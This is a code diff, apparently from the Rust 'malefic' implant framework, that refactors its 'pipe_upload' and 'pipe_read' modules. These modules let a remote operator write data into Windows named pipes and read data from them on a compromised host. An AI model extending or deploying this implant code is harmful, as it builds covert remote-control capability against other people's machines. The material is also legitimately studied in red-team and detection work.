@@ -1,18 +1,20 @@
-use std::io::{Read, Write};
-use crate::{check_field, check_request, Module, Result, TaskError, TaskResult};
+use crate::{check_field, check_request, Module, Result, TaskResult};
 use malefic_proto::proto::implantpb::spite::Body;
 use async_trait::async_trait;
-use obfstr::obfstr;
+use futures::{SinkExt};
 use malefic_helper::{debug, to_error};
 use malefic_helper::win::pipe::{PipeClient};
-use malefic_proto::proto::implantpb;
 use malefic_proto::proto::modulepb::Response;
 use malefic_trait::module_impl;
+
 pub struct PipeUpload {}
 
 #[async_trait]
 #[module_impl("pipe_upload")]
-impl Module for PipeUpload {
+impl Module for PipeUpload {}
+
+#[async_trait]
+impl crate::ModuleImpl for PipeUpload {
     async fn run(
         &mut self,
         id: u32,
@@ -22,10 +24,9 @@ impl Module for PipeUpload {
         let request = check_request!(receiver, Body::PipeRequest)?;
         let pipe_name = check_field!(request.name)?;
 
-        let mut pipe_client = match PipeClient::connect(&*pipe_name) {
+        let pipe_client = match PipeClient::connect(&pipe_name) {
             Ok(client) => client,
             Err(e) => {
-                debug!("Failed to connect to pipe");
                 return Err(e.into());
             },
         };
@@ -33,7 +34,7 @@ impl Module for PipeUpload {
         if request.data.is_empty() {
             // if data is empty, do nothing
         } else {
-            to_error!(pipe_client.write_all(&request.data));
+            to_error!(pipe_client.write(&request.data))?;
             drop(pipe_client);
             return Ok(TaskResult::new_with_ack(id, 0));
         }
@@ -42,7 +43,12 @@ impl Module for PipeUpload {
 
         loop {
             let block = check_request!(receiver, Body::Block)?;
-            let _ = to_error!(pipe_client.write_all(&request.data));
+
+            let data_len = block.content.len();
+
+            if data_len != 0 {
+                to_error!(pipe_client.write(&block.content))?;
+            }
 
             if block.end {
                 drop(pipe_client);
@@ -56,12 +62,14 @@ impl Module for PipeUpload {
     }
 }
 
-
 pub struct PipeRead {}
 
 #[async_trait]
 #[module_impl("pipe_read")]
-impl Module for PipeRead {
+impl Module for PipeRead {}
+
+#[async_trait]
+impl crate::ModuleImpl for PipeRead {
     async fn run(
         &mut self,
         id: u32,
@@ -71,7 +79,7 @@ impl Module for PipeRead {
         let request = check_request!(receiver, Body::PipeRequest)?;
         let pipe_name: String = check_field!(request.name)?;
 
-        let mut pipe_client = match PipeClient::connect(&*pipe_name) {
+        let pipe_client = match PipeClient::connect(&*pipe_name) {
             Ok(client) => client,
             Err(e) => {
                 debug!("Failed to connect to pipe");
